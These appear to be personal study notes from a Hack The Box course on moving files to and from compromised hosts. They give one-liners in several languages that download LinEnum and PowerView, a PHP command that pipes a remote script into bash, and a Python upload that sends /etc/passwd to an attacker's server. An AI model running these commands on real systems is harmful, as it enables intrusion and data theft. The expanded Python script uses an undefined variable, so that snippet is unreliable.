---
Title: HTB\File_Transfers\Using Code
tags:
  - os/linux
  - os/windows
source: HTB\File_Transfers\Using Code
---

# HTB\File_Transfers\Using Code

> Źródło: `HTB\File_Transfers\Using Code`

### Using Python one liners (Download):

```bash
Ovas420@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

```

```bash
Ovas420@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


### Using PHP Download file_get_contents()

```bash
Ovas420@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```


### Using PHP Download Fopen()

```bash
Ovas420@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```


### php download a file and pipe it to bash
```bash
Ovas420@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Note**: `The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.`

Ruby and Perl are other popular languages that can also be used to transfer files.
These two programming languages also support running one-liners from an operating system command line using the option -e.

### Ruby
```bash
Ovas420@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```


### Perl
```bash
Ovas420@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### Javascript Code
The following javascript code is based on (https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)
We will create a file wget.js with the following content:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Download a file using javascript and cscript.exe

```cmd
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBScript (https://en.wikipedia.org/wiki/VBScript)

VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

we will create a wget.vbs file with the following content:

```VBS
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

```

Download a File Using VBScript and cscript.exe

```cmd
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Python Upload to target
If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation.
The Python3 requests module allows you to send HTTP requests (GET, POST, PUT, etc.) using Python.
We can use the following code if we want to upload a file to our Python3 uploadserver.


starting the python uploadserver module

```bash
Ovas420@htb[/htb]$ python3 -m uploadserver
```

uploading a file using a python one-liner

```bash
Ovas420@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


we can split this one-liner into a file to see it clearer

```python
# To use the requests function, we need to import the module first.
import requests

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file.
r = requests.post(url,files={"files":file})
```

**Powiązane:** [[Graph-Home]] [[OS-Windows]]
